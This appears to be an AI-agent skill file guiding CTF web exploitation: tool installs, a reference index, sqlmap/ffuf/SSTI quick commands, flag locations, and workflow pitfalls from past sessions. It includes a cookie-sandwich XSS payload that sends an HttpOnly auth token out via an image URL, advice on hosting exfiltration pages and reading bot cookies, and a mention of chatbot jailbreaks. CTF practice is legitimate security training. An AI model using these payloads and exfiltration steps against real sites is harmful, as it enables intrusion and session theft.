---
name: ctf-web
description: Provides web exploitation techniques for CTF challenges. Use when the target is primarily an HTTP application, API, browser client, template engine, identity flow, or smart-contract frontend/backend surface, including XSS, SQLi, SSTI, SSRF, XXE, JWT, auth bypass, file upload, request smuggling, OAuth/OIDC, SAML, prototype pollution, and similar web bugs. Do not use it for native binary memory corruption, reverse engineering of standalone executables, disk or memory forensics, or pure cryptanalysis unless the web flaw is still the main path to the flag.
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
---

# CTF Web Exploitation

Use this skill as a routing and execution guide for web-heavy challenges. Keep the first pass short: map the app, confirm the trust boundary, and only then dive into the detailed technique notes.

## Prerequisites

**Python packages (all platforms):**
```bash
pip install sqlmap flask-unsign requests
```

**Linux (apt):**
```bash
apt install hashcat jq curl
```

**macOS (Homebrew):**
```bash
brew install hashcat jq curl
```

**Go tools (all platforms, requires Go):**
```bash
go install github.com/ffuf/ffuf/v2@latest
```

**Manual install:**
- ysoserial — [GitHub](https://github.com/frohoff/ysoserial), requires Java (Java deserialization payloads)

## Additional Resources

- [sql-injection.md](sql-injection.md) - SQL injection techniques: auth bypass, UNION extraction, filter bypasses, second-order SQLi, truncation, race-assisted leaks, INSERT ON DUPLICATE KEY UPDATE password overwrite, innodb_table_stats WAF bypass
- [server-side.md](server-side.md) - PHP type juggling, php://filter LFI, Python str.format traversal, SSTI (Jinja2, Twig, ERB, Mako, EJS, Vue.js, Smarty), SSRF (Host header, DNS rebinding, curl redirect, unescaped-dot regex, SNI FTP smuggling, mod_vhost_alias), PHP hash_hmac NULL
- [server-side-2.md](server-side-2.md) - XXE (basic, OOB, DOCX upload), XML injection via X-Forwarded-For, PHP variable variables, PHP uniqid predictable filename, sequential regex replacement bypass, command injection (newline, blocklist, sendmail CGI, multi-barcode, git CLI), GraphQL injection (introspection, batching, interpolation)
- [server-side-exec.md](server-side-exec.md) - Direct code execution paths, upload-to-RCE, deserialization-adjacent execution, LaTeX injection, header and API abuses
- [server-side-exec-2.md](server-side-exec-2.md) - More execution chains: SQLi fragmentation, path parser tricks, polyglot uploads, wrapper abuse, filename injection, BMP pixel webshell with filename truncation
- [server-side-deser.md](server-side-deser.md) - Java/Python/PHP deserialization and race-condition playbooks, PHP SoapClient CRLF SSRF via deserialization
- [server-side-advanced.md](server-side-advanced.md) - Advanced SSRF, traversal, archive, parser, framework, and modern app-server issues, Nginx alias traversal
- [server-side-advanced-2.md](server-side-advanced-2.md) - Docker API SSRF, Castor/XML, Apache expression reads, parser discrepancies, Windows path tricks, rogue MySQL server file read
- [server-side-advanced-3.md](server-side-advanced-3.md) - Part 3 (CSAW/35C3/ASIS/PlaidCTF 2018): WAV polyglot upload, multi-slash URL `path.startswith` bypass, Xalan XSLT `math:random()` seed guess, SoapClient `_user_agent` CRLF method smuggling, `gopher:///` no-host URL scheme bypass, SSRF credential leak via attacker-specified outbound URL
- [server-side-advanced-4.md](server-side-advanced-4.md) - Part 4: WeasyPrint SSRF/file read (CVE-2024-28184), MongoDB regex/$where blind oracle, Pongo2 Go template injection, ZIP PHP webshell, basename() bypass, wget CRLF SSRF→SMTP, Gopher SSRF to MySQL blind SQLi, React Server Components Flight RCE (CVE-2025-55182), AMQP/TLS interception via sslsplit+arpspoof, CairoSVG XXE, Bazaar repo reconstruction
- [client-side.md](client-side.md) - XSS, CSRF, cache poisoning, DOM tricks, admin bot abuse, request smuggling, paywall bypass
- [client-side-advanced.md](client-side-advanced.md) - CSP bypasses, Unicode tricks, XSSI, CSS exfiltration, browser normalization quirks, postMessage null origin bypass
- [auth-and-access.md](auth-and-access.md) - Auth/authz bypasses, hidden endpoints, IDOR, redirect chains, subdomain takeover, AI chatbot jailbreaks
- [auth-and-access-2.md](auth-and-access-2.md) - Part 2 (2018-era): `std::unordered_set` bucket collision auth bypass, `nodeprep.prepare` Unicode homograph username collision, SRP A=0/A=N auth bypass, ArangoDB AQL MERGE privilege escalation
- [auth-jwt.md](auth-jwt.md) - JWT/JWE manipulation, weak secrets, header injection, key confusion, replay
- [auth-infra.md](auth-infra.md) - OAuth/OIDC, SAML, CORS, CI/CD secrets, IdP abuse, login poisoning
- [node-and-prototype.md](node-and-prototype.md) - Prototype pollution, JS sandbox escape, Node.js attack chains
- [web3.md](web3.md) - Solidity and Web3 challenge notes
- [cves.md](cves.md) - CVE-driven techniques you can match against challenge banners, headers, dependency leaks, or version strings
- [field-notes.md](field-notes.md) - Long-form exploit notes: quick references for SQLi, XSS, LFI, JWT, SSTI, SSRF, command injection, XXE, deserialization, race conditions, auth bypass, and multi-stage chains
- [broken-link-hijacking.md](broken-link-hijacking.md) - Beyond subdomain takeover: dead external resources (expired JS domains, deprecated npm/unpkg packages, dangling S3/GH Pages, unclaimed social handles) for supply-chain XSS, content injection, or phishing on target's domain
- [bot-xss-pna-patterns.md](references/bot-xss-pna-patterns.md) - Bot-based XSS patterns: URL validation bypass (@userinfo), multi-port cookie sharing, JSON-as-HTML XSS sinks, SameSite/Lax behavior table, cross-origin popup capabilities
- [deskmesh-flask-dual-port.md](references/deskmesh-flask-dual-port.md) - Flask dual-port app pattern: URL @-userinfo bypass, cookie jar overflow to evict HttpOnly, dangling markup exfiltration, Chrome PNA behavior
- [deskmesh-patterns.md](references/deskmesh-patterns.md) - Deskmesh technique catalog: cookie tossing, URL userinfo bypass, dangling markup, Flask text/html sink
- [deskmesh-cookie-xss-patterns.md](references/deskmesh-cookie-xss-patterns.md) - Cookie reflection + dangling markup XSS, DOMPurify 3.3.1 with current limitations
- [deskmesh-actual-exploitability-2026.md](references/deskmesh-actual-exploitability-2026.md) - **Session log from the HackNyx CTF (June 2026)**: which attack paths were tried, which work, which blockers remain. Read this first if you are about to attempt this challenge. Includes live bot version (HeadlessChrome 149.0.0.0), author hint confirmation, and HTML hosting constraints
- [bot-chromedriver-w3c-hijack.md](references/bot-chromedriver-w3c-hijack.md) - Drive the running bot directly via chromedriver's W3C HTTP API: navigate, dismiss alerts, execute JS, read cookies, or decrypt on-disk `chrome-prof*/Default/Cookies` when the bot has already quit
- [bot-xss-exploitation.md](references/bot-xss-exploitation.md) - Bot-based XSS patterns
- [bot-xss-cookie-exfil.md](references/bot-xss-cookie-exfil.md) - Bot-based XSS + cookie exfiltration patterns
- [bot-url-bypass-and-pna.md](references/bot-url-bypass-and-pna.md) - URL userinfo bypass for bot URL validation, Chrome PNA blocking public→private fetches
- [bot-xss-html-hosting-constraints.md](references/bot-xss-html-hosting-constraints.md) - **Public HTML hosting matrix for bot XSS exfil** (June 2026): which free services serve HTTP:80 + custom HTML + no restrictive CSP, the trifecta needed for `@-userinfo` bot attacks. ngrok free fails (HTTPS-only), catbox.moe fails (CSP `default-src 'self'`), webhook.site is logging-only, Cloudflare Workers is the cleanest option
- [dalctf2026-patterns.md](references/dalctf2026-patterns.md) - DalCTF2026 patterns
- [modern-xs-leaks-patterns.md](references/modern-xs-leaks-patterns.md) - **Comprehensive XS-Leak + bot-XSS reference** consolidated from [xsleaks/wiki](https://github.com/xsleaks/wiki) + [terjanq/Tiny-XSS-Payloads](https://github.com/terjanq/Tiny-XSS-Payloads). Cross-site oracle mental model, primitive taxonomy (timing/cache/navigations/element-leaks), defense bypass map (COOP/CORP/Fetch-Metadata/partitioned cache), payload catalog by browser constraint, 7-step bot-XSS decision tree, and a Chrome 147/149 reality table of dead primitives. **Use this for any admin-bot challenge.**
- [dompurify-3.3.1-mxss-verification.md](references/dompurify-3.3.1-mxss-verification.md) - Empirical mXSS verification recipe: 12-payload test set + local server template + CDN-URL fallback (cdnjs 404, jsdelivr works) + Chrome-version-specific results. **Use when prior session's DOMPurify findings are stale or you suspect a new bypass.**
- [sekaictf2025-hard-web-patterns.md](references/sekaictf2025-hard-web-patterns.md) - SekaiCTF 2025 hard web: WordPress POP + php://filter generated payloads, SvelteKit/Vite SSR prototype pollution, WASM externref/browser exfil under CSP, Hibernate/H2/JShell local pivot chains
- [web-hard-pattern-playbook.md](references/web-hard-pattern-playbook.md) - Ready-to-use hard web playbook: WordPress/PHP POP tracing, `php://filter` generated payload workflow, SvelteKit/Vite prototype-pollution probe matrix, WASM/admin-bot CSP triage, Hibernate/H2 local-pivot checklist. Templates: [prototype-pollution-probes.sh](templates/prototype-pollution-probes.sh), [hql-h2-probes.txt](templates/hql-h2-probes.txt)

## Empirical Testing — CRITICAL when a reference describes an attack primitive

The deskmesh-* references contain several specific attack primitives (CRLF injection in URLs, DOMPurify 3.3.1 mXSS via `selectedcontent` or backtick-script) that **DO NOT WORK on Chrome 147/149 as of June 2026**, despite being described as functional in older writeups. Before committing to a primitive from any reference:

1. **Set up a logging server** that records raw HTTP request paths (e.g., Python `http.server` with a custom handler).
2. **Trigger the primitive locally** with the actual Chrome version that runs the bot (match `chromium --version`).
3. **Inspect the raw request bytes** — for CRLF, check whether the server received two separate request lines (header injection worked) or one line with percent-encoded bytes (browser blocked it).
4. **For mXSS**: use the actual browser's HTML parser (not jsdom) to confirm whether the sanitized output re-renders to XSS.

Do NOT trust a primitive based on a writeup alone if the writeup predates a major browser version change. Especially watch for:
- **CRLF in URLs**: blocked Chrome 88+ (early 2021). Anything before 2021 claiming CRLF works is stale.
- **DOMPurify mXSS**: test cases often work in jsdom (test runner) but NOT in real browsers. Always test with headless Chrome.
- **SameSite cookie behaviors**: changed substantially in Chrome 80 and again with SameSite=Lax-by-default. Use `document.cookie` reflection tests, not writeup reasoning.
- **Bot HTML exfil hosting**: many public file hosts add `Content-Security-Policy: default-src 'self'` which BLOCKS exfil. Verify CSP on the served response BEFORE committing to a hosting service. See [bot-xss-html-hosting-constraints.md](references/bot-xss-html-hosting-constraints.md) for the service matrix.

## When to Pivot

- If the target is a native binary, custom VM, or firmware image, switch to `/ctf-reverse` first.
- If the HTTP bug only gives you code execution and the hard part becomes memory corruption or seccomp escape, switch to `/ctf-pwn`.
- If the "web" challenge really turns on JWT math, custom MACs, or crypto primitives, switch to `/ctf-crypto`.
- If the web challenge involves analyzing logs, PCAPs, or recovering artifacts from a web server, switch to `/ctf-forensics`.
- If the challenge requires gathering intelligence from public web sources, DNS records, or social media before exploitation, switch to `/ctf-osint`.

## First-Pass Workflow

1. Identify the real boundary: browser only, backend only, mixed app, or auth flow.
2. Capture one normal request/response pair for every major feature before fuzzing.
3. Enumerate hidden functionality from JS bundles, response headers, routes, and alternate methods.
4. Classify the likely bug family: injection, authz, parser mismatch, upload, trust proxy, state machine, or client-side execution.
5. Build the smallest proof first: leak, bypass, or primitive. Save full exploit chaining for later.

## Quick Start Commands

```bash
# Recon
curl -sI https://target.com
ffuf -u https://target.com/FUZZ -w wordlist.txt
curl -s https://target.com/robots.txt

# SQLi quick test
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# JWT decode (no verification)
echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Cookie decode (Flask)
flask-unsign --decode --cookie '<cookie>'
flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt

# SSTI probes
curl "https://target.com/page?name={{7*7}}"
curl "https://target.com/page?name={{config}}"

# Request inspection
curl -v -X POST https://target.com/api -H "Content-Type: application/json" -d '{}'
```

## First Questions to Answer

- Is the flag likely in the browser, an API response, a local file, a database row, or an internal service?
- Does the app trust user-controlled data in templates, redirects, file paths, headers, serialized objects, or background jobs?
- Are there multiple parsers disagreeing with each other: proxy vs app, URL parser vs fetcher, sanitizer vs browser, serializer vs filter?
- Can you turn the bug into a smaller primitive first: read one file, forge one token, call one internal endpoint, trigger one bot visit?

## High-Value Recon Checks

- Read the HTML, inline scripts, and bundled JS before guessing the API surface.
- Compare what the UI submits with what the backend accepts; optional JSON fields often unlock hidden paths.
- Check obvious metadata and helper paths early: `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/admin`, `/debug`, `/.git/`, `/.env`.
- Try alternate verbs and content types on interesting routes: `GET`, `POST`, `PUT`, `PATCH`, `TRACE`, JSON, form, multipart, XML.
- Treat file upload, PDF/export, webhook, OAuth callback, and admin bot features as likely exploit multipliers.

## Fast Pattern Map

- SQL errors, odd filtering, or state-dependent DB behavior: start with [sql-injection.md](sql-injection.md).
- Templating, file reads, SSRF, command injection, XML, or parser bugs: start with [server-side.md](server-side.md) and [server-side-exec.md](server-side-exec.md).
- XSS, CSP bypass, admin bot, admin bot, client routing, DOM issues, or scriptless exfiltration: start with [client-side.md](client-side.md).
- Session forgery, hidden admin route, JWT, OAuth, SAML, or weak trust boundaries: start with [auth-and-access.md](auth-and-access.md), [auth-jwt.md](auth-jwt.md), and [auth-infra.md](auth-infra.md).
- Node.js apps, prototype pollution, VM sandboxes, or SSRF into internal services: add [node-and-prototype.md](node-and-prototype.md).
- Smart contract frontends or blockchain-integrated apps: add [web3.md](web3.md).

## Common Chain Shapes

- Recon -> hidden route -> auth bypass -> internal file read -> token or flag
- XSS or HTML injection -> admin bot -> privileged action -> secret leak
- Traversal or upload -> config/source leak -> secret recovery -> session forgery
- SSRF -> metadata or internal API -> credential leak -> code execution
- SQLi or NoSQL injection -> credential bypass -> second-stage template or upload abuse

## Deep-Dive Notes

Use [field-notes.md](field-notes.md) once you have confirmed the challenge is truly web-heavy and you need the long exploit catalog.

- Recon, SQLi, XSS, traversal, JWT, SSTI, SSRF, command injection, XXE, and deserialization quick notes
- Deserialization, race conditions, file upload to RCE, and multi-stage chain examples
- Node, OAuth/SAML, CI/CD, Web3, bot abuse, CSP bypasses, and modern browser tricks
- CVE-shaped playbooks and older challenge patterns that still show up in modern CTFs

## Common Flag Locations

- Files: `/flag.txt`, `/flag`, `/app/flag.txt`, `/home/*/flag*`
- Environment: `/proc/self/environ`, process command line, debug config dumps
- Database: tables named `flag`, `flags`, `secret`, or seeded challenge content
- HTTP: custom headers, archived responses, hidden routes, admin exports
- Browser: hidden DOM nodes, `data-*` attributes, inline state objects, source maps

## Workflow Pitfalls (from observed user feedback)

- **Do NOT spend time searching for writeups of challenges with zero solves globally.** If `ctftime.org`, GitHub, Twitter, and Google all return nothing, the writeup does not exist yet. Stop searching after 2-3 minutes and pivot to empirical testing against the running challenge (or a local Docker setup). The user has explicitly redirected away from extensive writeup research on 0-solve challenges — focus that time on source code analysis and primitive verification instead.
- **When a CTF challenge has source available**, download and analyze it BEFORE building the local environment. The source usually reveals the intended attack class and the specific primitive you need to find a bypass for.
- **When a primitive is described in a skill reference as "known to work"** but seems too convenient (e.g., browser-level bug that would be widely known), always empirically verify with the actual browser version the bot uses. Stale references are common — see the deskmesh-* references for examples of broken (CRLF) or browser-version-dependent (DOMPurify mXSS) claims.
- **Same rule applies to teammate claims and author hints.** A teammate saying "cache replay works" or an author replying "approach (b) reach the API as rendered HTML" is a HINT to investigate, NOT a verified primitive. Always run the empirical test before committing to the bootstrap. For the deskmesh case: the teammate's cache-replay theory was promising but `fetch('/api/x', {headers:{'X-Test':'A'}}).then(()=>location.href='/api/x')` against a server that returns different responses per header showed Chrome issues a fresh request without the header — no cache reuse. **Test teammate hypotheses with the same rigor you apply to skill references.**
- **Don't summarize "I can't find writeup" and stop.** If a challenge has 0 solves, the writeup genuinely does not exist. The correct response is to test primitives empirically against the local instance, document each one, and either find an alternative or report the concrete blocker to the user.
- **When the author gives a directional hint (e.g., "approach X is right, but the specific mechanism is..."), enumerate the sub-paths under that approach and test each empirically.** Don't fixate on the examples the asker enumerated — the hint points to the approach, not necessarily the specific mechanism. The user listed "OPTIONS, HEAD, alternate methods" as examples for hint (b) but the real mechanism under (b) was a different sub-path.
- **When a public file host serves your exfil page, ALWAYS verify the served response's CSP before committing to the hosting service.** Many public file hosts (catbox.moe, transfer.sh, GitHub raw) add `default-src 'self'` to prevent their CDN being abused for XSS — this BLOCKS `new Image().src` to your webhook. Cloudflare Workers, your own VPS, or a self-hosted tunnel are the only free options that satisfy HTTP:80 + custom HTML + no CSP.
- **Bot WebDriverWait timing is the silent killer of "cache replay" and "race-based" bootstrap theories.** When the bot uses `WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "queue-page")))` and the h1#queue-page is in the static HTML of the page, the wait completes the moment the page begins parsing. The bot's next `driver.get('/escalate')` is called before the inline script's `DOMContentLoaded` listener has a chance to fire, let alone issue its fetch. Any bootstrap that depends on the legit `api()` fetch completing first (cache replay, cookie pre-warming, in-flight request reuse) is structurally broken — the fetch either never runs OR is canceled by the next navigation. **Test the bot's WebDriverWait against an actual timing measurement, not just code reading**, before committing to primitives that depend on async page-side behavior.
- **Cache replay / rendered-API bootstrap requires the exact browser flow, not a simplified substitute.** Deskmesh showed that simple `fetch('/api/x', {headers:{...}}).then(()=>location.href='/api/x')` and same-window variants can fail, while the author-intended flow works: attacker page opens `/queue`, then navigates itself to a `blob:` document whose script calls `history.back()`, causing a second attacker hit that 302s to `/api/tickets/<id>`. That precise blob/history-back state machine caused Chromium 149 to render the cached `text/html` API response and execute stored XSS. When validating cache/navigation primitives, reproduce the exact navigation topology from the writeup or hypothesis before declaring it dead. See `references/deskmesh-actual-exploitability-2026.md` for the corrected reproduction.
- **Two `banner` cookies with different paths can swallow a HttpOnly `auth` cookie in the value when one opens with `"` and the other closes with `"`.** Werkzeug's lenient cookie parser reads past the `;` separator to find a matching closing quote. This is the cookie sandwich primitive — see `references/deskmesh-cookie-xss-patterns.md` for the full payload and curl reproduction. Works on `/status` endpoints that reflect `{{ cookie | safe }}` and is a one-shot full-exfil (flag text + admin JWT in one image request URL). Verify with: `curl -H $'Cookie: banner="<img src=\'http://x/?x=; auth=TEST.TOKEN; banner=\'>"'` and check that `auth=TEST.TOKEN` appears in the rendered img src.
- **When the user pushes back with "try harder" / "kalau gabung" / "cuba lagi" after I've already hit dead ends, the right response is empirical findings, NOT another iteration of the same approach.** If I have already tested all reachable primitive classes and have concrete blockers, say so with the evidence — list what was tried, what failed, and what is the actual unblocker (specific teammate info, new CVE, infra detail I do not have). Do not fake a retry to seem productive. The user accepts honest dead-end reports with blockers MUCH better than circular re-trying of the same path. **The correct escalation when stuck is: (1) the concrete blocker I cannot bypass, (2) the specific information that would unblock it, (3) what I CAN do with current knowledge (local solve, alternative challenge, skill update).** Combining my approach with a teammate's is only useful when each has a working bootstrap — if both are stuck on the same bootstrap, combining gives two stuck approaches, not one working.

## SekaiCTF 2025 Web3 / TON Patterns

Patterns from SekaiCTF 2025 blockchain challenges: TON `addr_var` vs `addr_std` address-encoding bypass against raw slice comparisons, plus user-controlled forward payloads as confused-deputy internal-message gadgets. Version-specific: verify TON global version / `@ton/core` behavior before relying on `addr_var`. See [sekaictf2025-web3-ton-patterns.md](references/sekaictf2025-web3-ton-patterns.md).

SekaiCTF 2025 hard web patterns now also include rednote-style search-result crash oracles and Notebook Viewer-style multi-origin iframe heap side channels, alongside WordPress POP, SvelteKit/Vite prototype pollution, WASM CSP bypass, and Hibernate/H2 local pivots. See [sekaictf2025-hard-web-patterns.md](references/sekaictf2025-hard-web-patterns.md) and the browser-oracle section in [web-hard-pattern-playbook.md](references/web-hard-pattern-playbook.md).
